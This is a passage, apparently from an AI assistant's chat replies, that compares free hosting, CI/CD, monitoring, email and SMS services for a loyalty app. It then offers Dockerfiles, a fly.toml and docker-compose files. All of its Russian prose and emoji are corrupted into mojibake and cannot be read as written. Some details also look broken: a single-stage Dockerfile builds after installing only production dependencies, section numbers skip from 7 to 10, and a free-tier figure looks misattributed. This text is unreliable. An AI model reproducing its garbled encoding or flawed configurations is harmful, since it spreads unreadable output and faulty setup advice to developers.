- ‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Supabase DB
- ‚úÖ CDN included
- ‚úÖ Image resizing on-the-fly

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 1 GB –º–∞–ª–æ
- ‚ùå 2 GB bandwidth –º–∞–ª–æ

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ —É–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å Supabase DB

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø STORAGE: Cloudflare R2**

**–ü–æ—á–µ–º—É:**

- ‚úÖ **Unlimited bandwidth** (–∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –ª–æ–≥–æ—Ç–∏–ø–æ–≤/–∞–≤–∞—Ç–∞—Ä–æ–≤)
- ‚úÖ 10 GB —Ö–≤–∞—Ç–∏—Ç –Ω–∞ 10,000+ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π
- ‚úÖ S3-compatible (–ª–µ–≥–∫–æ —Å–º–µ–Ω–∏—Ç—å –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞)

***

## üîÑ **6. CI/CD PIPELINE**

### **–í–∞—Ä–∏–∞–Ω—Ç A: GitHub Actions** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 2,000 minutes/–º–µ—Å—è—Ü (public repos)
- 500 MB storage (artifacts)
- Linux/Windows/macOS runners

**–ü–ª—é—Å—ã:**

- ‚úÖ **–í—Å—Ç—Ä–æ–µ–Ω –≤ GitHub**
- ‚úÖ 2,000 –º–∏–Ω—É—Ç —Ö–≤–∞—Ç–∏—Ç –Ω–∞ ~100 –¥–µ–ø–ª–æ–µ–≤
- ‚úÖ –û–≥—Ä–æ–º–Ω—ã–π marketplace actions
- ‚úÖ Matrix builds (—Ç–µ—Å—Ç–∏—Ä—É–π –Ω–∞ —Ä–∞–∑–Ω—ã—Ö –≤–µ—Ä—Å–∏—è—Ö Node)
- ‚úÖ Secrets management

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 2,000 –º–∏–Ω—É—Ç –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å –¥–ª—è –±–æ–ª—å—à–∏—Ö —Ç–µ—Å—Ç–æ–≤

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –õ—é–±–æ–π –ø—Ä–æ–µ–∫—Ç –Ω–∞ GitHub

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: GitLab CI/CD** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 400 minutes/–º–µ—Å—è—Ü
- Shared runners

**–ü–ª—é—Å—ã:**

- ‚úÖ –í—Å—Ç—Ä–æ–µ–Ω –≤ GitLab
- ‚úÖ Docker registry included

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 400 –º–∏–Ω—É—Ç –º–µ–Ω—å—à–µ —á–µ–º GitHub

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å GitLab

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø CI/CD: GitHub Actions**

**–ü–æ—á–µ–º—É:**

- ‚úÖ 2,000 –º–∏–Ω—É—Ç/–º–µ—Å—è—Ü
- ‚úÖ –ü—Ä—è–º–∞—è –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Fly.io/Vercel/Render
- ‚úÖ –û–≥—Ä–æ–º–Ω–æ–µ –∫–æ–º—å—é–Ω–∏—Ç–∏

**–ü—Ä–∏–º–µ—Ä workflow:**

```yaml
name: Deploy
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: superfly/flyctl-actions@v1
        with:
          args: deploy
```


***

## üìä **7. –ú–û–ù–ò–¢–û–†–ò–ù–ì + ALERTING**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Better Stack (formerly Logtail)** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 1 GB logs/–º–µ—Å—è—Ü
- 10 monitors (uptime checks)
- 1,000 incidents/–º–µ—Å—è—Ü
- Unlimited team members

**–ü–ª—é—Å—ã:**

- ‚úÖ **–í—Å—ë –≤ –æ–¥–Ω–æ–º** (logs + uptime + incidents)
- ‚úÖ –ö—Ä–∞—Å–∏–≤—ã–π UI
- ‚úÖ Telegram/Slack notifications
- ‚úÖ 10 uptime monitors (–ø—Ä–æ–≤–µ—Ä—è–π Backend, Frontend, DB)

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 1 GB logs –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Production MVP

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: UptimeRobot** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 50 monitors
- 5-minute checks
- Email/Slack/Telegram alerts

**–ü–ª—é—Å—ã:**

- ‚úÖ **50 monitors** (–æ—á–µ–Ω—å –º–Ω–æ–≥–æ)
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π
- ‚úÖ –ù–∞–≤—Å–µ–≥–¥–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –¢–æ–ª—å–∫–æ uptime monitoring (–Ω–µ—Ç –ª–æ–≥–æ–≤)
- ‚ùå 5-minute checks (–Ω–µ real-time)

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ë–∞–∑–æ–≤—ã–π uptime monitoring

***

### **–í–∞—Ä–∏–∞–Ω—Ç C: Grafana Cloud** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 10,000 series metrics
- 50 GB logs
- 50 GB traces
- 14-day retention

**–ü–ª—é—Å—ã:**

- ‚úÖ Professional monitoring
- ‚úÖ 50 GB logs (–±–æ–ª—å—à–µ –≤—Å–µ—Ö)
- ‚úÖ Grafana dashboards

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å
- ‚ùå –ù—É–∂–Ω–æ –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞—Ç—å Prometheus exporter

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ –∑–Ω–∞–µ—à—å Grafana

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê: Better Stack**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –í—Å—ë –≤ –æ–¥–Ω–æ–º (–ª–æ–≥–∏ + uptime + –∞–ª–µ—Ä—Ç—ã)
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π setup
- ‚úÖ Telegram notifications (–∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è —Ç–µ–±—è)

**Setup:**

```typescript
// Winston transport –¥–ª—è Better Stack
import { createLogger, transports } from 'winston'
import { Logtail } from '@logtail/node'
import { LogtailTransport } from '@logtail/winston'

const logtail = new Logtail(process.env.LOGTAIL_TOKEN)

export const logger = createLogger({
  transports: [
    new LogtailTransport(logtail)
  ]
})
```


***

## üìß **10. EMAIL SERVICE**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Resend** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 3,000 emails/–º–µ—Å—è—Ü
- 100 emails/–¥–µ–Ω—å
- Email API + SMTP
- Webhooks (bounce, open, click tracking)

**–ü–ª—é—Å—ã:**

- ‚úÖ **–õ—É—á—à–∏–π DX** (Developer Experience)
- ‚úÖ React Email templates (–∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã React = email)
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π API
- ‚úÖ Webhooks –¥–ª—è tracking

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå 3,000/–º–µ—Å—è—Ü –º–æ–∂–µ—Ç –Ω–µ —Ö–≤–∞—Ç–∏—Ç—å –ø—Ä–∏ —Ä–æ—Å—Ç–µ

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Modern email service

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Mailgun** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 5,000 emails/–º–µ—Å—è—Ü (–ø–µ—Ä–≤—ã–µ 3 –º–µ—Å—è—Ü–∞)
- –ü–æ—Ç–æ–º \$0.80/1000 emails

**–ü–ª—é—Å—ã:**

- ‚úÖ 5,000 emails
- ‚úÖ –ú–æ—â–Ω—ã–π API

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –ü–æ—Å–ª–µ 3 –º–µ—Å—è—Ü–µ–≤ –ø–ª–∞—Ç–Ω–æ
- ‚ùå –¢—Ä–µ–±—É–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏—é –¥–æ–º–µ–Ω–∞

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** –ï—Å–ª–∏ –Ω—É–∂–Ω–æ > 3,000

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø EMAIL: Resend**

**–ü–æ—á–µ–º—É:**

- ‚úÖ 3,000/–º–µ—Å—è—Ü —Ö–≤–∞—Ç–∏—Ç –¥–ª—è MVP
- ‚úÖ React Email (–ª–µ–≥–∫–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å –∫—Ä–∞—Å–∏–≤—ã–µ –ø–∏—Å—å–º–∞)
- ‚úÖ Webhooks (–º–æ–∂–µ—à—å –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å –¥–æ—Å—Ç–∞–≤–∫—É)

***

## üì± **11. SMS PROVIDER (–î–ª—è –†–æ—Å—Å–∏–∏)**

### **–í–∞—Ä–∏–∞–Ω—Ç A: SMS.RU** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 5 –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö SMS –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
- –ü–æ—Ç–æ–º ~2-3‚ÇΩ/SMS

**–ü–ª—é—Å—ã:**

- ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç –≤ –†–§
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π API
- ‚úÖ HLR-lookup

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –ü–æ—á—Ç–∏ —Å—Ä–∞–∑—É –ø–ª–∞—Ç–Ω–æ

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** Production –≤ –†–§

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: SMSC.RU** ‚≠ê‚≠ê‚≠ê

**Free Tier:**

- 10‚ÇΩ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
- ~2‚ÇΩ/SMS

**–ü–ª—é—Å—ã:**

- ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç –≤ –†–§
- ‚úÖ –î–µ—à–µ–≤–ª–µ —á–µ–º SMS.RU

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå –°—Ç–∞—Ä—ã–π UI

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø SMS: SMS.RU**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –ù–∞–¥—ë–∂–Ω—ã–π
- ‚úÖ –•–æ—Ä–æ—à–∏–π API
- ‚úÖ ~200‚ÇΩ —Ö–≤–∞—Ç–∏—Ç –Ω–∞ 100 SMS (–¥–ª—è MVP –Ω–æ—Ä–º)

***

# üèÜ **–ò–¢–û–ì–û–í–ê–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: –ü–û–õ–ù–´–ô –ë–ï–°–ü–õ–ê–¢–ù–´–ô –°–¢–ï–ö**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              RECOMMENDED FREE INFRASTRUCTURE             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Backend API:       Fly.io (3 VM √ó 256 MB)               ‚îÇ
‚îÇ Frontend:          Vercel (unlimited Next.js deploys)   ‚îÇ
‚îÇ PostgreSQL:        Neon.tech (3 GB storage)             ‚îÇ
‚îÇ Redis:             Upstash (10,000 commands/–¥–µ–Ω—å)       ‚îÇ
‚îÇ S3 Storage:        Cloudflare R2 (10 GB + unlimited BW) ‚îÇ
‚îÇ CI/CD:             GitHub Actions (2,000 min/–º–µ—Å—è—Ü)     ‚îÇ
‚îÇ Monitoring:        Better Stack (1 GB logs + uptime)    ‚îÇ
‚îÇ SSL/DNS:           Cloudflare (free)                    ‚îÇ
‚îÇ Email:             Resend (3,000 emails/–º–µ—Å—è—Ü)          ‚îÇ
‚îÇ SMS:               SMS.RU (~200‚ÇΩ –¥–ª—è —Å—Ç–∞—Ä—Ç–∞)            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

üí∞ –°–¢–û–ò–ú–û–°–¢–¨: 0‚ÇΩ/–º–µ—Å—è—Ü + ~200‚ÇΩ –Ω–∞ SMS –¥–ª—è –ø–µ—Ä–≤—ã—Ö 100 –≥–æ—Å—Ç–µ–π
üìà CAPACITY: –¥–æ 5,000 –≥–æ—Å—Ç–µ–π, 10,000 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–µ—Å—è—Ü
```

**–ü–æ—á–µ–º—É –∏–º–µ–Ω–Ω–æ —ç—Ç–æ—Ç —Å—Ç–µ–∫:**

1. ‚úÖ **–í—Å—ë –±–µ—Å–ø–ª–∞—Ç–Ω–æ** (–∫—Ä–æ–º–µ SMS, –Ω–æ —ç—Ç–æ –∫–æ–ø–µ–π–∫–∏)
2. ‚úÖ **Always-on** (Fly.io –Ω–µ —Å–ø–∏—Ç, –∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è Telegram bot)
3. ‚úÖ **Production-ready** (–Ω–µ hobby tier, –∞ —Ä–µ–∞–ª—å–Ω—ã–π production)
4. ‚úÖ **–ú–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ** (–ª–µ–≥–∫–æ –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ –ø–ª–∞—Ç–Ω—ã–µ –ø–ª–∞–Ω—ã –ø—Ä–∏ —Ä–æ—Å—Ç–µ)
5. ‚úÖ **Modern DX** (—Ö–æ—Ä–æ—à–∏–π Developer Experience)

–ì–æ—Ç–æ–≤ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å **Docker setup + CI/CD –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é** –¥–ª—è —ç—Ç–æ–≥–æ —Å—Ç–µ–∫–∞! üöÄ

---

# –ü—Ä–∏–Ω–∏–º–∞—é —Ç–≤–æ–∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã –ø–æ —ç—Ç–æ–º—É –≤–æ–ø—Ä–æ—Å—É

–û—Ç–ª–∏—á–Ω–æ! üéâ –¢–µ–ø–µ—Ä—å –¥–µ—Ç–∞–ª–∏–∑–∏—Ä—É–µ–º **Infrastructure \& DevOps** –¥–ª—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ —Å—Ç–µ–∫–∞. –ó–∞–¥–∞–º **30+ –≤–æ–ø—Ä–æ—Å–æ–≤** —Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏ –∏ –∫–æ–¥–æ–º.

***

# üîß **INFRASTRUCTURE \& DEVOPS: 35+ –î–ï–¢–ê–õ–¨–ù–´–• –í–û–ü–†–û–°–û–í**

## üê≥ **–ë–õ–û–ö 1: DOCKER \& CONTAINERIZATION (8 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **1Ô∏è‚É£ Dockerfile –¥–ª—è Backend: Multi-stage –∏–ª–∏ Single-stage?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞—Ç—å Dockerfile –¥–ª—è NestJS backend?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) Single-stage (–ø—Ä–æ—Å—Ç–æ–π)**

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build
CMD ["node", "dist/main.js"]
```

**B) Multi-stage (–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π)** ‚≠ê

```dockerfile
# Stage 1: Dependencies
FROM node:20-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci

# Stage 2: Build
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build
RUN npm prune --production

# Stage 3: Production
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./
USER node
EXPOSE 3000
CMD ["node", "dist/main.js"]
```

**C) Multi-stage —Å –∫—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π**

```dockerfile
# + –¥–æ–±–∞–≤–ª—è–µ–º npm cache –º–µ–∂–¥—É stages
RUN npm ci --cache /tmp/.npm
```

**D) Distroless image (–º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä)**

```dockerfile
FROM gcr.io/distroless/nodejs20-debian11
COPY --from=builder /app/dist ./dist
CMD ["dist/main.js"]
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) Multi-stage**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –†–∞–∑–º–µ—Ä –æ–±—Ä–∞–∑–∞ ~150 MB (vs 500+ MB –≤ single-stage)
- ‚úÖ –ù–µ –≤–∫–ª—é—á–∞–µ–º dev dependencies –≤ production
- ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å (–∑–∞–ø—É—Å–∫–∞–µ–º –æ—Ç user `node`, –Ω–µ `root`)
- ‚úÖ –ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ª–æ—ë–≤ (–±—ã—Å—Ç—Ä—ã–π rebuild –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –∫–æ–¥–∞)

**–ü–æ–ª–Ω—ã–π Dockerfile –¥–ª—è Backend:**

```dockerfile
# apps/backend/Dockerfile
FROM node:20-alpine AS deps
WORKDIR /app
COPY package*.json ./
COPY package-lock.json ./
RUN npm ci --only=production

# Build stage
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
COPY package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build
RUN npm prune --production

# Production stage
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production

# Security: run as non-root
RUN addgroup --system --gid 1001 nodejs
RUN adduser --system --uid 1001 nestjs
USER nestjs

COPY --from=builder --chown=nestjs:nodejs /app/dist ./dist
COPY --from=builder --chown=nestjs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nestjs:nodejs /app/package.json ./

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=40s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"

CMD ["node", "dist/main.js"]
```


***

### **2Ô∏è‚É£ Dockerfile –¥–ª—è Worker: –û—Ç–¥–µ–ª—å–Ω—ã–π –æ–±—Ä–∞–∑ –∏–ª–∏ —Ç–æ—Ç –∂–µ?**

**–í–û–ü–†–û–°:** Worker (BullMQ processor) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–æ—Ç –∂–µ –∫–æ–¥ —á—Ç–æ –∏ API. –û—Ç–¥–µ–ª—å–Ω—ã–π Dockerfile?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –¢–æ—Ç –∂–µ Dockerfile, —Ä–∞–∑–Ω—ã–µ CMD** ‚≠ê

```dockerfile
# –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ—Ç –∂–µ –æ–±—Ä–∞–∑, –Ω–æ –≤ fly.toml —Ä–∞–∑–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã
FROM node:20-alpine AS runner
# ... (—Ç–æ—Ç –∂–µ Dockerfile)

# –ó–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ env var
CMD ["sh", "-c", "node dist/main.js --$PROCESS_TYPE"]
```

**B) –û—Ç–¥–µ–ª—å–Ω—ã–π Dockerfile –¥–ª—è worker**

```dockerfile
# apps/worker/Dockerfile
FROM backend:latest
CMD ["node", "dist/worker.js"]
```

**C) –û–¥–∏–Ω –æ–±—Ä–∞–∑, —Ä–∞–∑–Ω—ã–µ entrypoint —Å–∫—Ä–∏–ø—Ç—ã**

```dockerfile
COPY scripts/start-api.sh ./
COPY scripts/start-worker.sh ./
CMD ["./start-api.sh"]  # override –≤ fly.toml
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: A) –¢–æ—Ç –∂–µ Dockerfile, —Ä–∞–∑–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –≤ fly.toml**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –û–¥–∏–Ω –æ–±—Ä–∞–∑ ‚Üí –ø—Ä–æ—â–µ –ø–æ–¥–¥–µ—Ä–∂–∫–∞
- ‚úÖ –û–¥–∏–Ω build ‚Üí –±—ã—Å—Ç—Ä–µ–µ CI/CD
- ‚úÖ Worker –∏ API –∏—Å–ø–æ–ª—å–∑—É—é—Ç –æ–¥–Ω—É –∫–æ–¥–æ–≤—É—é –±–∞–∑—É

**–†–µ–∞–ª–∏–∑–∞—Ü–∏—è:**

```typescript
// apps/backend/src/main.ts
async function bootstrap() {
  const processType = process.env.PROCESS_TYPE || 'api';
  
  if (processType === 'api') {
    // –ó–∞–ø—É—Å–∫–∞–µ–º HTTP server
    const app = await NestFactory.create(AppModule);
    await app.listen(3000);
  } else if (processType === 'worker') {
    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–æ–ª—å–∫–æ Worker
    const app = await NestFactory.createApplicationContext(WorkerModule);
    // Worker –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –Ω–∞ –æ—á–µ—Ä–µ–¥–∏ BullMQ
  } else if (processType === 'cron') {
    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–æ–ª—å–∫–æ Cron jobs
    const app = await NestFactory.createApplicationContext(CronModule);
  }
}
bootstrap();
```

**fly.toml:**

```toml
# Backend API
[processes]
api = "node dist/main.js"
worker = "node dist/main.js"
cron = "node dist/main.js"

[env]
api.PROCESS_TYPE = "api"
worker.PROCESS_TYPE = "worker"
cron.PROCESS_TYPE = "cron"
```


***

### **3Ô∏è‚É£ Docker Compose –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏: –ù—É–∂–µ–Ω –ª–∏?**

**–í–û–ü–†–û–°:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Docker Compose –¥–ª—è dev –æ–∫—Ä—É–∂–µ–Ω–∏—è –∏–ª–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å PostgreSQL/Redis –æ—Ç–¥–µ–ª—å–Ω–æ?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –ü–æ–ª–Ω—ã–π docker-compose (Backend + PostgreSQL + Redis + Frontend)** ‚≠ê

```yaml
version: '3.9'
services:
  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: max_loyalty
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: dev
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
  
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
  
  backend:
    build:
      context: ./apps/backend
      dockerfile: Dockerfile
      target: development
    environment:
      DATABASE_URL: postgresql://dev:dev@postgres:5432/max_loyalty
      REDIS_URL: redis://redis:6379
    ports:
      - "3000:3000"
    volumes:
      - ./apps/backend:/app
      - /app/node_modules
    depends_on:
      - postgres
      - redis
  
  frontend:
    build:
      context: ./apps/frontend
      dockerfile: Dockerfile.dev
    ports:
      - "3001:3000"
    volumes:
      - ./apps/frontend:/app
      - /app/node_modules
    environment:
      NEXT_PUBLIC_API_URL: http://localhost:3000
```

**B) –¢–æ–ª—å–∫–æ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (PostgreSQL + Redis), Backend/Frontend –ª–æ–∫–∞–ª—å–Ω–æ**

```yaml
version: '3.9'
services:
  postgres:
    image: postgres:15-alpine
    # ...
  redis:
    image: redis:7-alpine
    # ...
```

**C) –ë–µ–∑ Docker Compose (–≤—Å—ë –ª–æ–∫–∞–ª—å–Ω–æ —á–µ—Ä–µ–∑ npm)**

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) –¢–æ–ª—å–∫–æ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –≤ Docker**

**–ü–æ—á–µ–º—É:**

- ‚úÖ PostgreSQL + Redis –≤ Docker ‚Üí –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –≤–µ—Ä—Å–∏–∏ –Ω–∞ –≤—Å–µ—Ö dev –º–∞—à–∏–Ω–∞—Ö
- ‚úÖ Backend/Frontend –∑–∞–ø—É—Å–∫–∞–µ–º –ª–æ–∫–∞–ª—å–Ω–æ (`npm run dev`) ‚Üí hot reload —Ä–∞–±–æ—Ç–∞–µ—Ç –±—ã—Å—Ç—Ä–µ–µ
- ‚úÖ –ù–µ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ—Å–æ–±–∏—Ä–∞—Ç—å –æ–±—Ä–∞–∑—ã –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –∫–æ–¥–∞

**docker-compose.dev.yml:**

```yaml
version: '3.9'

services:
  postgres:
    image: postgres:15-alpine
    container_name: max-loyalty-postgres
    restart: unless-stopped
    environment:
      POSTGRES_DB: max_loyalty_dev
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: dev_password_change_me
    ports:
      - "5432:5432"
    volumes:
      - postgres_dev_data:/var/lib/postgresql/data
      - ./scripts/init-db.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U dev -d max_loyalty_dev"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    container_name: max-loyalty-redis
    restart: unless-stopped
    ports:
      - "6379:6379"
    volumes:
      - redis_dev_data:/data
    healthcheck:
